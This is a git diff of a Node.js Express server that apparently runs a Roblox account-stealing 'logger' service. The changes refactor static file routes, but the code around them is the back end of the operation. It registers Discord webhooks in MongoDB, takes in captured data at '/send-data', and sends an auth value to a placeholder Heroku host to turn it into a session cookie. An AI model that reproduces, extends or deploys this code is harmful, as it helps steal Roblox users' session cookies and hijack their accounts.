@@ -8,6 +8,7 @@ const serverconf = require('./server.json')
 const mongoclient = require("mongodb").MongoClient
 const loggerfile = fs.readFileSync('./loggerscripts/app.js').toString()
 const sanitize = require('mongo-sanitize')
+const path = require('path')
 require('dotenv').config()
 
 
@@ -24,16 +25,8 @@ app.use(function(req, res, next) {
 });
 app.use(bodyparser.json())
 
+app.use(express.static(path.join(__dirname, 'public')));
 
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/public/index.html')
-})
-app.get('/app.js', (req,res) => {
-    res.sendFile(__dirname + '/public/app.js')
-})
-app.get('/mystyles.css', (req,res) => {
-    res.sendFile(__dirname + '/public/mystyles.css')
-})
 app.get('/roblox-api', (req,res) => {
     const loggerid = req.query.id
     
@@ -47,9 +40,7 @@ app.get('/roblox-api', (req,res) => {
         client.close();
     })
 })
-app.get('/convertcookie', (req,res) => {
-    res.send(fs.readFileSync('./convertCookie.php').toString())
-})
+
 
 async function convertToCookie(auth) {
     let data = await fetch("https://YOURHEROKUAPP.herokuapp.com/convertcookie?suggest="+auth, {
@@ -71,12 +62,14 @@ async function validwebhook(webhook) {
     return data !== null 
 }
 
+app.get('/convertcookie', (req,res) => {
+    res.send(fs.readFileSync('./convertCookie.php').toString())
+})
 
 app.post('/create-log', async (req, res) => {
     console.log(req.body)
     let webhook = req.body.webhook
 
-    console.log(webhook)
 
     if (!webhook) {
         res.send("Invalid webhook. DOESNT EXIST")
@@ -92,6 +85,9 @@ app.post('/create-log', async (req, res) => {
         let collection = db.collection('Webhooks')
         webhook = sanitize(webhook)
 
+
+        console.log(webhook)
+        console.log('SUCCESFULLY CONNECTED TO MONGO')
 
         let lastindex = await collection.countDocuments()
         await lastindex
@@ -153,6 +149,10 @@ app.post('/send-data', async (req, res) => {
         return client.close();
     })
 })
+
+app.get('*', (req,res) =>{
+    res.sendFile(path.join(__dirname+'/public/index.html'));
+});
 
 app.listen(process.env.PORT || 3000, () => {
     console.log('Listening..')
